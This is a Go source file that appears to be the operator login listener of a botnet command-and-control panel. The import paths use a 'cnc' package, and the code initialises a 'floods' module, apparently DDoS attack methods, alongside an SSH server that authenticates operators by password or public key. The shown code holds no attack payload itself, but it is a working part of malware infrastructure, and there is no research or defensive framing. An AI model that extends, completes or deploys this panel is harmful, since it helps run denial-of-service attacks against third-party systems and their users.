package master

import (
	"cnc/internal/database"
	"cnc/internal/master/command/commands"
	"cnc/internal/master/floods"
	"cnc/internal/master/views"
	"cnc/pkg/logging"
	"cnc/pkg/sshd"
	"encoding/hex"
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
)

func (l *Listener) Listen() {
	sshListener, err := sshd.ListenSSH(fmt.Sprintf(":%d", l.Port), l.server)
	if err != nil {
		logging.Println("Error listening for connections: %s", err.Error())
		return
	}

	// yeah
	logging.Global.Info().
		Int("port", l.Port).
		Msg("Waiting for master connections..")

	// initialize all commands
	commands.Init()
	floods.Init()

	// serve stuff
	sshListener.HandlerFunc = views.Prompt
	sshListener.Serve()
}

func NewListener(port int, key string) (*Listener, error) {
	var listener = &Listener{
		Port:       port,
		PrivateKey: key,
		server: &ssh.ServerConfig{
			PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
				profile, err := database.User.SelectByUsername(conn.User())
				if err != nil {
					return nil, fmt.Errorf("failed to fetch user profile: %w", err)
				}

				if profile.Password != database.Hash(password) {
					return nil, fmt.Errorf("invalid password")
				}

				return nil, nil
			},

			PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
				profile, err := database.User.SelectByUsername(conn.User())
				if err != nil {
					return nil, fmt.Errorf("failed to fetch user profile: %w", err)
				}

				decodedKey, err := hex.DecodeString(profile.PublicKey)
				if err != nil {
					return nil, fmt.Errorf("failed to decode public key: %w", err)
				}

				authorizedKey, _, _, _, err := ssh.ParseAuthorizedKey(decodedKey)
				if err != nil {
					return nil, fmt.Errorf("failed to parse authorized key: %w", err)
				}

				if ssh.FingerprintSHA256(key) != ssh.FingerprintSHA256(authorizedKey) {
					return nil, fmt.Errorf("public key authentication failed for user %s", conn.User())
				}

				return &ssh.Permissions{Extensions: map[string]string{
					"public_key": "true",
				}}, nil
			},
		},
	}

	// reads key file
	content, err := os.ReadFile(key)
	if err != nil {
		logging.Println("key file not found (path=%s)", key)
		return nil, err
	}

	// do private key parsing
	private, err := ssh.ParsePrivateKey(content)
	if err != nil {
		logging.Println("key file could not be parsed (err=%s)", err.Error())
		return nil, err
	}

	listener.server.AddHostKey(private)
	return listener, nil
}
